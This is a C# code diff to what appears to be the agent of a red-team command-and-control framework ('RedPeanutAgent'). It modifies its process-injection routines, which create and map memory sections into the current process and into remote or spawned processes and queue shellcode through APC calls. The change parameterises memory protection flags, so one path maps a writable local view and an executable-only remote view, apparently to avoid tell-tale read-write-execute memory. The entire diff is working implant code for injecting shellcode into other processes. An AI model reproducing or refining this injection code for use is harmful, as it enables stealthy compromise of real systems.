@@ -33,7 +33,7 @@ namespace RedPeanutAgent.Execution
 
             //Crteate section in current process
             IntPtr section = IntPtr.Zero;
-            section = InjectionHelper.CreateSection(size);
+            section = InjectionHelper.CreateSection(size, Natives.PAGE_EXECUTE_READWRITE);
             if (section == IntPtr.Zero)
             {
                 return false;
@@ -42,7 +42,7 @@ namespace RedPeanutAgent.Execution
             //Map section to current process
             IntPtr baseAddr = IntPtr.Zero;
             IntPtr viewSize = (IntPtr)size;
-            InjectionHelper.MapViewOfSection(section, Natives.GetCurrentProcess(), ref baseAddr, ref viewSize);
+            InjectionHelper.MapViewOfSection(section, Natives.GetCurrentProcess(), ref baseAddr, ref viewSize, Natives.PAGE_EXECUTE_READWRITE);
             if (baseAddr == IntPtr.Zero)
             {
                 return false;
@@ -54,7 +54,7 @@ namespace RedPeanutAgent.Execution
             //Map remote section
             IntPtr baseAddrEx = IntPtr.Zero;
             IntPtr viewSizeEx = (IntPtr)size;
-            InjectionHelper.MapViewOfSection(section, hproc, ref baseAddrEx, ref viewSizeEx);
+            InjectionHelper.MapViewOfSection(section, hproc, ref baseAddrEx, ref viewSizeEx, Natives.PAGE_EXECUTE_READWRITE);
             if (baseAddrEx == IntPtr.Zero || viewSizeEx == IntPtr.Zero)
             {
                 return false;
@@ -84,7 +84,7 @@ namespace RedPeanutAgent.Execution
 
             //Crteate section in current process
             IntPtr section = IntPtr.Zero;
-            section = InjectionHelper.CreateSection(size);
+            section = InjectionHelper.CreateSection(size, Natives.PAGE_EXECUTE_READWRITE);
             if (section == IntPtr.Zero)
             {
                 return false;
@@ -93,7 +93,7 @@ namespace RedPeanutAgent.Execution
             //Map section to current process
             IntPtr baseAddr = IntPtr.Zero;
             IntPtr viewSize = (IntPtr)size;
-            InjectionHelper.MapViewOfSection(section, Natives.GetCurrentProcess(), ref baseAddr, ref viewSize);
+            InjectionHelper.MapViewOfSection(section, Natives.GetCurrentProcess(), ref baseAddr, ref viewSize, Natives.PAGE_EXECUTE_READWRITE);
             if (baseAddr == IntPtr.Zero)
             {
                 return false;
@@ -105,7 +105,7 @@ namespace RedPeanutAgent.Execution
             //Map remote section
             IntPtr baseAddrEx = IntPtr.Zero;
             IntPtr viewSizeEx = (IntPtr)size;
-            InjectionHelper.MapViewOfSection(section, procInfo.hProcess, ref baseAddrEx, ref viewSizeEx);
+            InjectionHelper.MapViewOfSection(section, procInfo.hProcess, ref baseAddrEx, ref viewSizeEx, Natives.PAGE_EXECUTE_READWRITE);
             if (baseAddrEx == IntPtr.Zero || viewSizeEx == IntPtr.Zero)
             {
                 return false;
@@ -152,7 +152,7 @@ namespace RedPeanutAgent.Execution
 
             //Crteate section in current process
             IntPtr section = IntPtr.Zero;
-            section = InjectionHelper.CreateSection(size);
+            section = InjectionHelper.CreateSection(size, Natives.PAGE_EXECUTE_READWRITE);
             if (section == IntPtr.Zero)
             {
                 return false;
@@ -161,7 +161,7 @@ namespace RedPeanutAgent.Execution
             //Map section to current process
             IntPtr baseAddr = IntPtr.Zero;
             IntPtr viewSize = (IntPtr)size;
-            InjectionHelper.MapViewOfSection(section, Natives.GetCurrentProcess(), ref baseAddr, ref viewSize);
+            InjectionHelper.MapViewOfSection(section, Natives.GetCurrentProcess(), ref baseAddr, ref viewSize, Natives.PAGE_READWRITE);
             if (baseAddr == IntPtr.Zero)
             {
                 return false;
@@ -173,7 +173,7 @@ namespace RedPeanutAgent.Execution
             //Map remote section
             IntPtr baseAddrEx = IntPtr.Zero;
             IntPtr viewSizeEx = (IntPtr)size;
-            InjectionHelper.MapViewOfSection(section, procInfo.hProcess, ref baseAddrEx, ref viewSizeEx);
+            InjectionHelper.MapViewOfSection(section, procInfo.hProcess, ref baseAddrEx, ref viewSizeEx, Natives.PAGE_EXECUTE);
             if (baseAddrEx == IntPtr.Zero || viewSizeEx == IntPtr.Zero)
             {
                 return false;
@@ -184,7 +184,7 @@ namespace RedPeanutAgent.Execution
                 return false;
             }
 
-            // Assign address of shellcode to the target thread apc queue
+            // Assign address of shellcode to the target apc queue
             if (!InjectionHelper.QueueApcThread(baseAddrEx, procInfo))
             {
                 return false;
@@ -225,24 +225,24 @@ namespace RedPeanutAgent.Execution
             return size;
         }
 
-        public static IntPtr CreateSection(uint size)
+        public static IntPtr CreateSection(uint size, uint protect)
         {
             Natives.LARGE_INTEGER largeinteger = new Natives.LARGE_INTEGER();
             largeinteger.LowPart = size;
 
             IntPtr section = IntPtr.Zero;
-            if (Natives.ZwCreateSection(ref section, Natives.GenericAll, IntPtr.Zero, ref largeinteger, Natives.PAGE_EXECUTE_READWRITE, Natives.SecCommit, IntPtr.Zero) != 0)
+            if (Natives.ZwCreateSection(ref section, Natives.GenericAll, IntPtr.Zero, ref largeinteger, protect, Natives.SecCommit, IntPtr.Zero) != 0)
             {
                 return IntPtr.Zero;
             }
             return section;
         }
 
-        public static bool MapViewOfSection(IntPtr section, IntPtr hprocess, ref IntPtr baseAddr, ref IntPtr viewSize)
+        public static bool MapViewOfSection(IntPtr section, IntPtr hprocess, ref IntPtr baseAddr, ref IntPtr viewSize, uint protect)
         {
             IntPtr soffset = IntPtr.Zero;
 
-            if (Natives.ZwMapViewOfSection(section, hprocess, ref baseAddr, IntPtr.Zero, IntPtr.Zero, soffset, ref viewSize, 1, 0, Natives.PAGE_EXECUTE_READWRITE) != 0)
+            if (Natives.ZwMapViewOfSection(section, hprocess, ref baseAddr, IntPtr.Zero, IntPtr.Zero, soffset, ref viewSize, 1, 0, protect) != 0)
             {
                 return false;
             }
